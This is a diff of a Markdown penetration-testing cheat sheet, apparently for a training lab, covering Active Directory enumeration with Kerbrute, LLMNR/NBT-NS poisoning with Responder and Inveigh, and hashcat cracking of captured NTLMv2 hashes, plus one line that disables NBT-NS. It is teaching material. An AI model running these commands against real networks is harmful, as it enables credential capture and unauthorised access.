@@ -1190,7 +1190,7 @@ N/A
 | `netstat -antb \|findstr 1080`                                 | Windows-based command used to list TCP network connections listening on port 1080. |
 
 ### 21. Active Directory Enumeration & Attacks
-
+{% raw %}
 #### Initial Enumeration 
 
 | Command                                                      | Description                                                  |
@@ -1206,7 +1206,7 @@ N/A
 | `./kerbrute_linux_amd64`                                     | Used to test the chosen complied `Kebrute` binary from a Linux-based host. |
 | `sudo mv kerbrute_linux_amd64 /usr/local/bin/kerbrute`       | Used to move the `Kerbrute` binary to a directory can be set to be in a Linux user's path. Making it easier to use the tool. |
 | `./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results` | Runs the Kerbrute tool to discover usernames in the domain (`INLANEFREIGHT.LOCAL`) specified proceeding the `-d` option and the associated domain controller specified proceeding `--dc`using a wordlist and outputs (`-o`) the results to a specified file. Performed from a Linux-based host. |
-
+{% endraw %}
 #### LLMNR/NTB-NS Poisoning 
 
 | Command                                                      | Description                                                  |
@@ -1214,6 +1214,7 @@ N/A
 | `responder -h`                                               | Used to display the usage instructions and various options available in `Responder` from a Linux-based host. |
 | `hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt` | Uses `hashcat` to crack `NTLMv2` (`-m`) hashes that were captured by responder and saved in a file (`frond_ntlmv2`). The cracking is done based on a specified wordlist. |
 | `Import-Module .\Inveigh.ps1`                                | Using the `Import-Module` PowerShell cmd-let to import the Windows-based tool `Inveigh.ps1`. |
+| `(Get-Command Invoke-Inveigh).Parameters`               | Used to retrieve the available options and functionality of the `Invoke-Inveigh` command on a Windows host. |
 | `Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y`    | Starts `Inveigh` on a Windows-based host with LLMNR & NBNS spoofing enabled and outputs the results to a file. |{% endraw %}
 | `.\Inveigh.exe`                                              | Starts the `C#` implementation of `Inveigh` from a Windows-based host. |
 | `$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces" Get-ChildItem $regkey \|foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}` | PowerShell script used to disable NBT-NS on a Windows host.  |
